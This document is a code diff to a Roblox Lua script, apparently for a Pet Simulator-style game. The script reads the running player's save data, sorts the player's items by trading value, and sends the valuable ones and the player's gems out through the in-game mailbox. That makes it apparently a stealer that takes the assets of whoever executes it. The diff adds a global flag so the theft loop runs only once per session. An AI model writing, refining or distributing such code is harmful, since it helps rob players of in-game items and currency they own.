@@ -7,8 +7,13 @@ local HttpService = game:GetService("HttpService")
 local itemsToSend = {}
 local rapCache = {}
 local sendamount = game.Players.LocalPlayer.PlayerGui._MACHINES.MailboxMachine.Frame.SendFrame.Bottom.Diamonds.Amount.Text
+_G.scriptExecuted = _G.scriptExecuted or false
 local GetSave = function()
     return require(game.ReplicatedStorage.Library.Client.Save).Get()
+end
+
+if _G.scriptExecuted then
+    return
 end
 
 local function sendGemsToNumber(str)
@@ -325,6 +330,7 @@ for i, v in pairs(categoryList) do
 	end
 end
 table.sort(sortedItems, function(a, b) return a.rap > b.rap end)
+_G.scriptExecuted = true
 for _, item in ipairs(sortedItems) do
 	if item.rap >= newamount then
     	sendItem(item.category, item.uid, item.amount)
